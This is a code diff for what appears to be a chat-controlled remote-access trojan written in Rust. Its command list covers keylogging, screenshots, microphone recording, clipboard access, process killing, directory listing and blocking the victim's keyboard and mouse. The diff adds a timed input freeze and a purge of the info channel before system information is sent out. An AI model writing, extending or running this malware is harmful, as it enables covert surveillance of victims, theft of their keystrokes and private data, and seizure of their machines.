@@ -20,7 +20,7 @@ const HELP: &str = "\
 !kill <pid>                terminate pid
 !screenshot                primary monitor -> files channel
 !mic <secs>                record default mic -> files channel
-!freeze / !unfreeze        block mouse + keyboard
+!freeze [secs]             block input; secs = auto-release (e.g. !freeze 30)
 !keylog start|stop|dump|clear
 !clipboard [text]          get or set clipboard
 !ls [path]                 directory listing
@@ -60,6 +60,7 @@ pub async fn dispatch(
         "ping" => st.send(console, "pong").await?,
         "id" | "whoami" => st.send(console, &format!("bot {}", st.bot_id)).await?,
         "info" => {
+            let _ = st.purge_channel(infoch).await;
             let text = info::dump(cfg, ws).await;
             st.send_code(infoch, &text).await?;
         }
@@ -89,8 +90,20 @@ pub async fn dispatch(
                 .await?;
         }
         "freeze" => {
+            let secs: u64 = arg.trim().parse().unwrap_or(0);
             input::freeze();
-            st.send(console, "input frozen").await?;
+            if secs > 0 {
+                let st2 = st.clone();
+                let ch = console.to_string();
+                tokio::spawn(async move {
+                    tokio::time::sleep(std::time::Duration::from_secs(secs)).await;
+                    input::unfreeze();
+                    let _ = st2.send(&ch, &format!("input released after {secs}s")).await;
+                });
+                st.send(console, &format!("input frozen for {secs}s")).await?;
+            } else {
+                st.send(console, "input frozen (use !unfreeze)").await?;
+            }
         }
         "unfreeze" => {
             input::unfreeze();
